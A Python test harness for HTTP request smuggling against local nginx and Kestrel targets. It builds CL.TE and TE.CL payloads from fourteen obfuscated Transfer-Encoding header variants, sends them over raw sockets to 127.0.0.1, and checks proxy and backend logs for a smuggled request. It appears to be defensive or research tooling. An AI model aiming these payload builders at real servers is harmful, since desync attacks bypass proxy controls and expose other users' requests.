#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import socket
import time
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable


@dataclass(frozen=True)
class Target:
    name: str
    host: str
    port: int
    proxy: bool


TE_VARIANTS: dict[str, list[bytes]] = {
    "exact": [b"Transfer-Encoding: chunked"],
    "mixed_case": [b"Transfer-Encoding: ChUnKeD"],
    "leading_ows": [b"Transfer-Encoding:  chunked"],
    "tab_ows": [b"Transfer-Encoding:\tchunked"],
    "trailing_ows": [b"Transfer-Encoding: chunked \t"],
    "identity_then_chunked_one": [b"Transfer-Encoding: identity, chunked"],
    "gzip_then_chunked_one": [b"Transfer-Encoding: gzip, chunked"],
    "chunked_then_identity_one": [b"Transfer-Encoding: chunked, identity"],
    "duplicate_identity_chunked": [b"Transfer-Encoding: identity", b"Transfer-Encoding: chunked"],
    "duplicate_chunked_identity": [b"Transfer-Encoding: chunked", b"Transfer-Encoding: identity"],
    "chunk_extension_token": [b"Transfer-Encoding: chunked;foo=bar"],
    "space_before_colon": [b"Transfer-Encoding : chunked"],
    "obs_fold": [b"Transfer-Encoding:", b" chunked"],
    "xchunked": [b"Transfer-Encoding: xchunked"],
}


def read_new_lines(path: Path, start: int) -> list[str]:
    if not path.exists():
        return []
    data = path.read_text(encoding="utf-8", errors="replace").splitlines()
    return data[start:]


def line_count(path: Path) -> int:
    if not path.exists():
        return 0
    return len(path.read_text(encoding="utf-8", errors="replace").splitlines())


def send_raw(target: Target, payload: bytes, timeout: float = 2.0) -> bytes:
    chunks: list[bytes] = []
    with socket.create_connection((target.host, target.port), timeout=timeout) as sock:
        sock.settimeout(0.5)
        sock.sendall(payload)
        try:
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        while True:
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, ConnectionResetError):
                break
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks)


def request_bytes(
    method: str,
    path: str,
    headers: Iterable[bytes],
    body: bytes,
    *,
    host: str = "localhost",
) -> bytes:
    lines = [f"{method} {path} HTTP/1.1".encode(), f"Host: {host}".encode(), *headers]
    return b"\r\n".join(lines) + b"\r\n\r\n" + body


def fake_request(path: str) -> bytes:
    return (
        f"GET {path} HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-R69-Smuggled: 1\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()


def build_cl_te(case_id: str, variant: list[bytes], token: str) -> tuple[bytes, str, str]:
    attack_path = f"/r69/attack/cl-te/{case_id}/{token}"
    smuggled_path = f"/r69/smuggled/cl-te/{case_id}/{token}"
    body = b"0\r\n\r\n" + fake_request(smuggled_path)
    headers = [
        f"Content-Length: {len(body)}".encode(),
        *variant,
        b"Connection: close",
    ]
    return request_bytes("POST", attack_path, headers, body), attack_path, smuggled_path


def build_te_cl(case_id: str, variant: list[bytes], token: str) -> tuple[bytes, str, str]:
    attack_path = f"/r69/attack/te-cl/{case_id}/{token}"
    smuggled_path = f"/r69/smuggled/te-cl/{case_id}/{token}"
    second = fake_request(smuggled_path)
    prefix = f"{len(second):x}\r\n".encode()
    body = prefix + second + b"\r\n0\r\n\r\n"
    headers = [
        f"Content-Length: {len(prefix)}".encode(),
        *variant,
        b"Connection: close",
    ]
    return request_bytes("POST", attack_path, headers, body), attack_path, smuggled_path


def parse_backend(lines: list[str]) -> list[dict]:
    records: list[dict] = []
    for line in lines:
        try:
            records.append(json.loads(line))
        except json.JSONDecodeError:
            records.append({"parseError": line})
    return records


def backend_paths(records: list[dict]) -> list[str]:
    return [str(record.get("path")) for record in records if "path" in record]


def run_one(
    target: Target,
    payload: bytes,
    attack_path: str,
    smuggled_path: str,
    backend_log: Path,
    proxy_log: Path,
) -> dict:
    backend_start = line_count(backend_log)
    proxy_start = line_count(proxy_log)
    started = time.time()
    response = send_raw(target, payload)
    time.sleep(0.35)
    backend_lines = read_new_lines(backend_log, backend_start)
    proxy_lines = read_new_lines(proxy_log, proxy_start) if target.proxy else []
    backend_records = parse_backend(backend_lines)
    paths = backend_paths(backend_records)
    proxy_attack_lines = [line for line in proxy_lines if attack_path in line]
    proxy_smuggled_lines = [line for line in proxy_lines if smuggled_path in line]
    return {
        "target": target.name,
        "durationMs": round((time.time() - started) * 1000, 1),
        "attackPath": attack_path,
        "smuggledPath": smuggled_path,
        "responsePrefix": response[:1000].decode("latin-1", "replace"),
        "responseSha256": __import__("hashlib").sha256(response).hexdigest(),
        "backendRecords": backend_records,
        "backendPaths": paths,
        "backendAttackSeen": attack_path in paths,
        "backendSmuggledSeen": smuggled_path in paths,
        "proxyLines": proxy_lines,
        "proxyAttackEntries": len(proxy_attack_lines),
        "proxySmuggledEntries": len(proxy_smuggled_lines),
        "candidate": target.proxy
        and smuggled_path in paths
        and len(proxy_attack_lines) == 1
        and len(proxy_smuggled_lines) == 0,
    }


def run_controls(target: Target, backend_log: Path, proxy_log: Path) -> dict:
    token = uuid.uuid4().hex

    body_attack = f"/r69/control/body/{token}"
    body_fake = f"/r69/control/body-fake/{token}"
    fake = fake_request(body_fake)
    body_payload = request_bytes(
        "POST",
        body_attack,
        [f"Content-Length: {len(fake)}".encode(), b"Connection: close"],
        fake,
    )
    body_result = run_one(target, body_payload, body_attack, body_fake, backend_log, proxy_log)

    first = f"/r69/control/two-first/{token}"
    second = f"/r69/control/two-second/{token}"
    two_payload = (
        request_bytes("GET", first, [b"Connection: keep-alive"], b"")
        + request_bytes("GET", second, [b"Connection: close"], b"")
    )
    two_result = run_one(target, two_payload, first, second, backend_log, proxy_log)

    body_ok = body_result["backendAttackSeen"] and not body_result["backendSmuggledSeen"]
    if target.proxy:
        body_ok = body_ok and body_result["proxyAttackEntries"] == 1 and body_result["proxySmuggledEntries"] == 0

    two_ok = two_result["backendAttackSeen"] and two_result["backendSmuggledSeen"]
    if target.proxy:
        two_ok = two_ok and two_result["proxyAttackEntries"] == 1 and two_result["proxySmuggledEntries"] == 1

    return {
        "bodyContainsFakeRequest": body_result,
        "twoLegitimateRequests": two_result,
        "bodyControlPassed": body_ok,
        "twoRequestControlPassed": two_ok,
        "passed": body_ok and two_ok,
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--backend-log", required=True)
    parser.add_argument("--proxy-log", required=True)
    parser.add_argument("--out", required=True)
    args = parser.parse_args()

    backend_log = Path(args.backend_log)
    proxy_log = Path(args.proxy_log)
    targets = [
        Target("nginx-buffered", "127.0.0.1", 5280, True),
        Target("nginx-streaming", "127.0.0.1", 5281, True),
        Target("kestrel-direct", "127.0.0.1", 5290, False),
    ]

    controls = {target.name: run_controls(target, backend_log, proxy_log) for target in targets}
    cases: list[dict] = []

    for case_id, variant in TE_VARIANTS.items():
        for shape, builder in (("cl-te", build_cl_te), ("te-cl", build_te_cl)):
            for target in targets:
                token = uuid.uuid4().hex
                payload, attack_path, smuggled_path = builder(case_id, variant, token)
                result = run_one(target, payload, attack_path, smuggled_path, backend_log, proxy_log)
                result.update({
                    "case": case_id,
                    "shape": shape,
                    "headersLatin1": [line.decode("latin-1") for line in variant],
                    "payloadSha256": __import__("hashlib").sha256(payload).hexdigest(),
                    "payloadLength": len(payload),
                })
                cases.append(result)

    failed_controls = [name for name, result in controls.items() if not result["passed"]]
    candidates = [
        {
            "target": item["target"],
            "case": item["case"],
            "shape": item["shape"],
            "attackPath": item["attackPath"],
            "smuggledPath": item["smuggledPath"],
        }
        for item in cases
        if item["candidate"]
    ]

    verdict = "INCONCLUSIVE_CONTROL_FAILURE" if failed_controls else (
        "POSITIVE_PROXY_KESTREL_DESYNC" if candidates else "NEGATIVE_NO_DESYNC"
    )
    output = {
        "verdict": verdict,
        "controls": controls,
        "failedControls": failed_controls,
        "candidates": candidates,
        "caseCount": len(cases),
        "cases": cases,
    }
    Path(args.out).write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(json.dumps({
        "verdict": verdict,
        "failedControls": failed_controls,
        "candidates": candidates,
        "caseCount": len(cases),
    }, indent=2, sort_keys=True))
    return 2 if verdict.startswith("POSITIVE") else (1 if verdict.startswith("INCONCLUSIVE") else 0)


if __name__ == "__main__":
    raise SystemExit(main())
